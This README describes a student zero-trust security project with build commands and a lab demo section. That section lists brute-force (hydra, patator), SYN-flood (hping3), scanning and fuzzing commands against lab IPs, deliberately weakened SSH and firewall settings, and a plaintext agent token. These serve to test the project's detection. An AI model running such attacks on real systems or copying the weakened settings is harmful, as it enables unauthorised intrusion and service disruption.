# Zero-Trust Security Suite (ZT Suite)

An FYP zero-trust security implementation for SME environments — identity-centric access control with MFA, endpoint posture verification, network traffic monitoring, and ML-based anomaly detection.

---

## Prerequisites

### Windows

Wireshark is installed for dependency `npcap`.

### Linux

Packet capture requires root privileges or CAP_NET_RAW capability.

When you run sudo command, Linux uses a restricted PATH different from user's path. This introduces conflicts with uv venv configs. To fix it:

```
# cd ../ then /.. back
~/.local/bin/uv run python -c "from src.config import settings; print(f'Output mode: {settings.output_mode}'); print(f'Output file: {settings.output_file}')"
sudo ~/.local/bin/uv run python -m src.main
```

---

## Build / Lint / Test Commands

### Backend

```bash
cd backend
uv sync
uv sync --dev
uv run uvicorn app.main:app --reload
uv run pytest
uv run pytest tests/test_auth.py
uv run pytest tests/test_auth.py::test_login -v
uv run pytest -k "login" -v
uv run pytest --cov=app --cov-report=html
uv run ruff check . && uv run ruff format .
uv run mypy .
uv run alembic upgrade head
uv run alembic revision --autogenerate -m "msg"
```

### Frontend

```bash
cd frontend
npm install
npm run dev
npm run build
npm run preview
npm test
npm run lint
npm run typecheck
```

### Endpoint Agent

```bash
cd agent
uv sync
sudo uv run python -m src.main
```

### Unit+Int Testing Start

```
# backend
uv sync && uv run alembic upgrade head && uv run uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
# frontend
npm run dev
# agent
uv sync && uv run python -m src.main
```

### FYP Demo

Kali: 192.168.211.129
Ubuntu: 192.168.211.130
Windows: 192.168.100.95

Hack:

```
sudo nmap -sU --top-ports 200 -T4 192.168.211.130

hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.130 -t 8 -W 2 -f

hydra -l testuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.211.130 -t 8 -W 2 -f

sudo nmap -sS -sV -O -A -p 1-10000 -T5 --min-rate 3000 --max-retries 1 192.168.211.130

sudo hping3 -S 192.168.211.130 -p 80 -i u1000 -c 20000

for p in 22 80 443 445 3389 8080; do
  sudo hping3 -S 192.168.211.130 -p "$p" -i u1000 -c 5000
done

for p in 21 22 23 25 53 80 110 135 139 143 443 445 3306 3389 5432 5900 8080; do
  sudo hping3 -S 192.168.211.130 -p "$p" -i u200 -c 20000
done

hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt -s 21 -t 32 -W 3 -w 5 -I -V ftp://192.168.211.130

hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt -t 8 -W 5 -I -V ftp://192.168.211.130

hydra -l testuser -P /usr/share/wordlists/rockyou.txt -s 21 -t 64 -W 1 -w 3 -I -V ftp://192.168.211.130

patator ftp_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16

ffuf -u http://192.168.211.130:8080/FUZZ -w /usr/share/wordlists/rockyou.txt -t 50
```

Confirmed:

```
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.130 -t 8 -W 2 -f

hydra -l testuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.211.130 -t 8 -W 2 -f

patator ftp_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16

patator ssh_login host=192.168.211.130 user=ftpuser password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -t 16

python -m http.server 8080
nmap -sV -p 8080 192.168.211.130
```

Configs:

```
ZT_AGENT_BACKEND_URL=http://192.168.100.95:8000
ZT_AGENT_DEVICE_ID=9
ZT_AGENT_AGENT_TOKEN=ztag_5xITauDK06LMR9xd72jSSMcwRfbQx_1rorhFj4BDijo

PasswordAuthentication yes
MaxAuthTries 100
MaxStartups 1000:100:1000
LoginGraceTime 120

sudo ufw disable
sudo sysctl -w net.ipv4.icmp_ratelimit=0
ulimit -n 65535
```
